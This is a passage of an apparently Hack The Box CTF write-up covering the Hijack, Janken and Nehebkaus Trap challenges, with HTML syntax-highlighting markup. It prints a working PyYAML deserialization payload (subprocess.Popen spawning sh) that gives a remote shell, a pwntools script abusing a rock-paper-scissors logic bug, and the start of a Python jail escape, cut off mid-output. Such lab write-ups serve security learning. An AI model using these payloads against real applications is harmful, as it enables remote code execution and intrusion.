</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target network-online.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>oneshot
</span></span><span class="line"><span class="cl"><span class="nv">RemainAfterExit</span><span class="o">=</span>yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/local/bin/service
</span></span><span class="line"><span class="cl"><span class="nv">ExecStop</span><span class="o">=</span>/usr/local/bin/service
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span></code></pre></td></tr></table>
</div>
</div><p>Just like that, we find the flag: <code>HTB{th3s3_4l13nS_4r3_s00000_b4s1c}</code></p>
<h2 id="misc">Misc
</h2><h3 id="hijack">Hijack
</h3><blockquote>
<p>The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship&rsquo;s Thermal Control System. Can you take advantage of the situation without raising any suspicion?
<strong>Difficulty: easy</strong></p>
</blockquote>
<hr>
<p>We are given an IP address and port to nc into:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc 159.65.94.38 <span class="m">30109</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upon connection, we are greeted with a simple menu system:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                                                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                                                                                                                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit
</span></span></code></pre></td></tr></table>
</div>
</div><p>Trying to create a config, we see very few input checks in place:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; <span class="m">1</span>                                                                                                                                                                                                                                        
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">- Creating new config -                                                                                                                                                                                                                    
</span></span><span class="line"><span class="cl">Temperature units <span class="o">(</span>F/C/K<span class="o">)</span>: A                                                                                                                                                                                                               
</span></span><span class="line"><span class="cl">Propulsion Components Target Temperature : B                                                                                                                                                                                               
</span></span><span class="line"><span class="cl">Solar Array Target Temperature : C                                                                                                                                                                                                         
</span></span><span class="line"><span class="cl">Infrared Spectrometers Target Temperature : D                                                                                                                                                                                              
</span></span><span class="line"><span class="cl">Auto Calibration <span class="o">(</span>ON/OFF<span class="o">)</span> : E                                                                                                                                                                                                              
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K                                        
</span></span><span class="line"><span class="cl">Uploading to ship...                                                                                                                                                                                                                       
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                              
</span></span></code></pre></td></tr></table>
</div>
</div><p>The returned serialized config looks to be base64 encoded, so let&rsquo;s see what this contains:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K&#34;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">!!python/object:__main__.Config <span class="o">{</span>IR_spectrometer_temp: D, auto_calibration: E, propulsion_temp: B,
</span></span><span class="line"><span class="cl">  solar_array_temp: C, units: A<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It looks like our config options that we created. However, loading this config fails even though creation was successful. A quick google search indicates that this <code>!!python/object:__main__</code> syntax is from PyYAML. There is a page on hacktricks that details how one might go about exploiting this: <a class="link" href="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization"  target="_blank" rel="noopener"
    >https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization</a></p>
<p>Under RCE category, we see it might be possible to execute shell command with the right syntax.
Testing the exploit:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;!!python/object/apply:subprocess.Popen                                                                                                                                                       
</span></span></span><span class="line"><span class="cl"><span class="s1">- ls&#39;</span> <span class="p">|</span> base64
</span></span><span class="line"><span class="cl"><span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo</span><span class="o">=</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Loading base64 config:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                                                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                                                                                                                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                                                                                                                                                   
</span></span><span class="line"><span class="cl">&gt; <span class="m">2</span>                                                                                                                                                                                                                                        
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">Serialized config to load: <span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo</span><span class="o">=</span>                                                                                                                                                    
</span></span><span class="line"><span class="cl">** Success **                                                                                                                                                                                                                              
</span></span><span class="line"><span class="cl">Uploading to ship...                                                                                                                                                                                                                       
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;                                                                                                                                                                                                                        
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                                                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                                                                                                                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                                                                                                                                                   
</span></span><span class="line"><span class="cl">&gt; chall.py                                                                                                                                                                                                                                 
</span></span><span class="line"><span class="cl">flag.txt                                                                                                                                                                                                                                   
</span></span><span class="line"><span class="cl">hijack.py
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>ls</code> is successfully executing! Now to read the flag.</p>
<p>I had some trouble producing a payload that would simply cat the flag.txt file. Presumably, my payload setup was not suitable for a command with several words (cat flag.txt), so to work around this I simply spawned a shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">sh</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat payload <span class="p">|</span> base64 
</span></span><span class="line"><span class="cl"><span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo</span><span class="o">=</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                   
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                     
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                            
</span></span><span class="line"><span class="cl">&gt; <span class="m">2</span>                                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">Serialized config to load: <span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo</span><span class="o">=</span>                             
</span></span><span class="line"><span class="cl">** Success **                                                                                                       
</span></span><span class="line"><span class="cl">Uploading to ship...                                                                                                
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;                                                                                                 
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                   
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                     
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                            
</span></span><span class="line"><span class="cl">&gt; cat flag.txt                                                                                                      
</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}</code></p>
<h3 id="janken">Janken
</h3><blockquote>
<p>As you approach an ancient tomb, you&rsquo;re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there&rsquo;s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you&rsquo;ll be denied entry.
<strong>Difficulty: easy</strong></p>
</blockquote>
<hr>
<p>In this challenge we are given a compiled binary called janken. Upon running it, we can view the rules for the game:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./janken 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">                                                                                                  
</span></span><span class="line"><span class="cl">                                                                                                          
</span></span><span class="line"><span class="cl">                                                                                                  
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">1.                                                                                                              
</span></span><span class="line"><span class="cl">2.                                                                                                             
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">&gt;&gt; <span class="m">2</span>                                                                                                                
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">                                          
</span></span><span class="line"><span class="cl">  <span class="o">[</span>*<span class="o">]</span> Rock     is called <span class="s2">&#34;Guu&#34;</span>   <span class="o">(</span><span class="o">)</span>.                                                                          
</span></span><span class="line"><span class="cl">  <span class="o">[</span>*<span class="o">]</span> Scissors is called <span class="s2">&#34;Choki&#34;</span> <span class="o">(</span><span class="o">)</span>.                                                                        
</span></span><span class="line"><span class="cl">  <span class="o">[</span>*<span class="o">]</span> Paper    is called <span class="s2">&#34;Paa&#34;</span>   <span class="o">(</span><span class="o">)</span>.                                                                          
</span></span><span class="line"><span class="cl">                                                                                                                  
</span></span><span class="line"><span class="cl">  1. Rock &gt; scissors, scissors &gt; paper, paper &gt; rock.                                                             
</span></span><span class="line"><span class="cl">  2. You have to win <span class="o">[</span>100<span class="o">]</span> <span class="nb">times</span> in a row in order to get the prize.                                            
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>To win, we must win 100 games of rock paper scissors in a row. If left up to chance, this is not realistic. There must be a way to force a win. I recall seeing this same problem presented in another CTF competition, picoCTF 2022. (RPS in Binary Exploitation category). In that challenge, the win condition was only checking if the player&rsquo;s input contained the winning string. So, by playing all 3 options at once you were guaranteed to win. We can try that here as well:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;&gt; <span class="m">1</span>                                                                                                                
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Let the game begin!                                                                                           
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Round <span class="o">[</span>1<span class="o">]</span>:                                                                                                      
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">Choose:                                                                                                             
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">Rock                                                                                                              
</span></span><span class="line"><span class="cl">Scissors                                                                                                           
</span></span><span class="line"><span class="cl">Paper                                                                                                             
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">&gt;&gt; rock,paper,scissors                                                                                              
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Guru<span class="err">&#39;</span>s choice: scissors                                                                                         
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Your  choice: rock,paper,scissors                                                                               
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You won this round! Congrats!                                                                                   
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Round <span class="o">[</span>2<span class="o">]</span>: 
</span></span></code></pre></td></tr></table>
</div>
</div><p>The syntax was a little picky, but we see a guaranteed winning combination with <code>rock,paper,scissors</code>.</p>
<p>Writing out <code>rock,paper,scissors</code> 100 times in a row is boring and tedious, so I channeled my inner programmer and spent twice as long making a script that will do it for me:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;178.62.64.13&#39;</span><span class="p">,</span> <span class="mi">31174</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">win</span> <span class="o">=</span> <span class="s1">&#39;rock,paper,scissors&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Start game 1 and chain</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Looping sendline is too fast, so I wait for interactive marker &gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span><span class="n">win</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvallS</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now to acquire the flag in extra speedy fashion:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python RPS.py
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Opening connection to 178.62.64.13 on port 31174: Done
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Receiving all data: Done <span class="o">(</span>223B<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Closed connection to 178.62.64.13 port <span class="m">31174</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Guru<span class="err">&#39;</span>s choice: rock                                                                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Your  choice: rock,paper,scissors                                                                               
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You won this round! Congrats!                                                                                   
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You are worthy! Here is your prize: HTB<span class="o">{</span>r0ck_p4p3R_5tr5tr_l0g1c_buG<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}</code></p>
<h3 id="nehebkaus-trap">Nehebkaus Trap
</h3><blockquote>
<p>In search of the ancient relic, you go looking for the Pharaoh&rsquo;s tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?
<strong>Difficulty: medium</strong></p>
</blockquote>
<hr>
<p>Connecting to the nc link, we find that it&rsquo;s a trap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> nc 104.248.169.117 <span class="m">32684</span>
</span></span><span class="line"><span class="cl">    __
</span></span><span class="line"><span class="cl">   <span class="o">{</span>00<span class="o">}</span>                                                                                                             
</span></span><span class="line"><span class="cl">   <span class="se">\_</span>_/                                                                                                             
</span></span><span class="line"><span class="cl">   /^/                                                                                                              
</span></span><span class="line"><span class="cl">  <span class="o">(</span> <span class="o">(</span>                                                                                                               
</span></span><span class="line"><span class="cl">   <span class="se">\_\_</span>____                                                                                                         
</span></span><span class="line"><span class="cl">   <span class="o">(</span>_______<span class="o">)</span>                                                                                                        
</span></span><span class="line"><span class="cl">  <span class="o">(</span>_________<span class="o">()</span>Ooo.                                                                                                  
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">[</span> Nehebkau<span class="err">&#39;</span>s Trap <span class="o">]</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">You are trapped!                                                                                                    
</span></span><span class="line"><span class="cl">Can you escape?
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Various shell commands do not work, and we quickly find that several critical inputs are blacklisted, such as single and double quotes, or dots.
The snake is our first subtle hint, we are likely trapped in a python jail! There is a posting on <a class="link" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"  target="_blank" rel="noopener"
    >hacktricks that covers this type of problem</a>. Unfortunately, most of the suggestions will not work for us with restrictions on dot, quotes, space and even uderscores. We can, however, print the globals and locals:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="nb">globals</span><span class="p">())</span>                                                                                                  
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;__name__&#39;</span><span class="p">:</span> <span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__package__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__loader__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">_frozen_importlib_external</span><span class="o">.</span><span class="n">SourceFileLoader</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f37eeb47c10</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__spec__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__annotations__&#39;</span><span class="p">:</span> <span class="p">{},</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;builtins&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__file__&#39;</span><span class="p">:</span> <span class="s1">&#39;/home/ctf/./jail.py&#39;</span><span class="p">,</span> <span class="s1">&#39;__cached__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;sys&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;time&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;BLACKLIST&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">),</span> <span class="s1">&#39;Color&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">__main__</span><span class="o">.</span><span class="n">Color</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">_print</span><span class="s1">&#39;: &lt;function _print at 0x7f37eeba3d90&gt;, &#39;</span><span class="n">banner</span><span class="s1">&#39;: &lt;function banner at 0x7f37eeae2c20&gt;, &#39;</span><span class="n">loop</span><span class="s1">&#39;: &lt;function loop at 0x7f37eeae2cb0&gt;, &#39;</span><span class="n">_</span><span class="s1">&#39;: 2}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">())</span>                                                                                                   
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
